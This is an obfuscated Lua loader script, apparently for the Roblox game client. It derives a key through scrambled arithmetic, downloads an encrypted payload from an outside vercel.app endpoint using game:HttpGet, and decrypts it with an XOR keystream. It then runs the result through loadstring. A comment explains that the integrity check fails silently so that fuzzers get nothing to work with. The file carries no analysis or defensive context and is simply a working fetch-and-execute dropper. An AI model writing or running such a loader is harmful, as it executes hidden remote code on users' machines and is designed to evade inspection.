local qbltqv=bit32 or bit
local o5z,r9z,ulov9,h4_
if qbltqv then o5z,r9z,ulov9,h4_=qbltqv.bxor,qbltqv.lshift,qbltqv.rshift,qbltqv.band
else
local function ea5_jt(kui) return kui%4294967296 end
o5z=function(kui,ln4r) local h5bl,cz6i=0,1 for f05tzo=1,32 do local o_qh,ingvv=kui%2,ln4r%2 if o_qh~=ingvv then h5bl=h5bl+cz6i end kui=(kui-o_qh)/2 ln4r=(ln4r-ingvv)/2 cz6i=cz6i*2 end return h5bl end
r9z=function(kui,ln4r) return ea5_jt(kui*2^ln4r) end
ulov9=function(kui,ln4r) return math.floor(ea5_jt(kui)/2^ln4r) end
h4_=function(kui,ln4r) local h5bl,cz6i=0,1 for f05tzo=1,32 do local o_qh,ingvv=kui%2,ln4r%2 if o_qh==1 and ingvv==1 then h5bl=h5bl+cz6i end kui=(kui-o_qh)/2 ln4r=(ln4r-ingvv)/2 cz6i=cz6i*2 end return h5bl end
end
local function ldxb53(kui) if kui==0 then kui=2654435769 end kui=o5z(kui,r9z(kui,13)) kui=o5z(kui,ulov9(kui,17)) kui=o5z(kui,r9z(kui,5)) return kui end
local d1jmc="f943ea".."37acb6".."a83a8".."b03".."fe2e".."476".."983".."67"
local g1z=tonumber(d1jmc:sub(1,8),16)
local bvio=tonumber(d1jmc:sub(9,16),16)
if g1z==0 then g1z=2654435769 end
if bvio==0 then bvio=2242054355 end
local y3pj=668265261
g1z=(g1z*(37242+27353))%4294967296
g1z=(g1z+(640933042+1029407872))%4294967296
bvio=o5z(bvio,(840183800+830157114))
g1z=(g1z+(90094228+208924708))%4294967296
bvio=o5z(bvio,299018936)
g1z=o5z(g1z,(728322299+2332472859))
g1z=(g1z+(533718504+1420260834))%4294967296
g1z=(g1z+(944868345+2207294307))%4294967296
bvio=o5z(bvio,(217266870+2934895782))
y3pj=(y3pj*3+1924420782)%4294967296
g1z=(g1z+(689163505+175163456))%4294967296
g1z=o5z(g1z,(344411303+3785558149))
g1z=o5z(g1z,d1jmc:byte(6))
y3pj=(y3pj*3+1249921630)%4294967296
g1z=(g1z+bvio)%4294967296
bvio=o5z(bvio,g1z)
g1z,bvio=bvio,g1z
y3pj=(y3pj*3+1720088157)%4294967296
g1z,bvio=bvio,g1z
g1z=(g1z+bvio)%4294967296
bvio=o5z(bvio,g1z)
g1z=(g1z+1252979725)%4294967296
bvio=o5z(bvio,(523673680+729306045))
g1z=(g1z+bvio)%4294967296
bvio=o5z(bvio,g1z)
y3pj=(y3pj*3+4025778386)%4294967296
g1z=o5z(g1z,d1jmc:byte(13))
g1z,bvio=bvio,g1z
g1z=(r9z(g1z,6)+ulov9(g1z,26))%4294967296
g1z,bvio=bvio,g1z
g1z=(g1z+357267169)%4294967296
g1z,bvio=bvio,g1z
g1z=(g1z*32229)%4294967296
g1z=(g1z*28645)%4294967296
g1z=(g1z+3631520112)%4294967296
g1z=(g1z+bvio)%4294967296
bvio=o5z(bvio,g1z)
local gm1g5z=string.format("%08x",g1z)..string.format("%08x",bvio)
local vpq4="https://lua-script-hosting-api.vercel.app/api/load/".."d37b497".."50733".."6d39685a".."c005c35".."2c4".."9c9a".."cfb6c".."594".."2afb".."2ceb7d".."5cdda".."8c9cab".."e"
vpq4=vpq4.."?n=".."89fc5bec".."3ab3".."07f2".."c42ce3f9".."f7cd".."023847".."2aa".."c02ac2a".."6bdb".."&p="..gm1g5z
local rwzkpo
for f05tzo=1,3 do
local s26gy,m85io=pcall(function() return game:HttpGet(vpq4) end)
if s26gy and type(m85io)=="string" and #m85io>=2 then rwzkpo=m85io break end
if f05tzo<3 then local vqsbe=(task and task.wait) or wait if vqsbe then pcall(vqsbe,1) end end
end
if not rwzkpo then return end
local vai=g1z
local hdiv=bvio
if vai==0 then vai=2654435769 end
if hdiv==0 then hdiv=2242054355 end
local h_wc,r4g={},{}
for e45 in rwzkpo:gmatch("%x%x") do
vai=ldxb53(vai)
hdiv=(hdiv+2654435769)%4294967296
local egwt=h4_(o5z(vai,ulov9(hdiv,11)),255)
h_wc[#h_wc+1]=string.char(o5z(tonumber(e45,16),egwt))
if #h_wc>=4096 then r4g[#r4g+1]=table.concat(h_wc) h_wc={} end
end
if #r4g==0 and #h_wc==0 then return end
if #h_wc>0 then r4g[#r4g+1]=table.concat(h_wc) end
local m7x7=table.concat(r4g)
-- Integrity gate: the payload ends with "--I:<8hex>", a checksum over
-- everything before it. A wrong key (binary garbage), a truncated
-- capture, or an edited payload all fail here SILENTLY: no error, no
-- output, nothing for a fuzzer to iterate against.
local ga42o=m7x7:match("%-%-I:(%x%x%x%x%x%x%x%x)%s*$")
if not ga42o then return end
m7x7=m7x7:gsub("%-%-I:%x%x%x%x%x%x%x%x%s*$","")
local z6k=5381
for f05tzo=1,#m7x7 do z6k=(z6k*33+m7x7:byte(f05tzo))%4294967296 end
if z6k%268435456~=tonumber(ga42o,16) then return end
local q5xnb_=loadstring(m7x7)
if q5xnb_ then return q5xnb_() end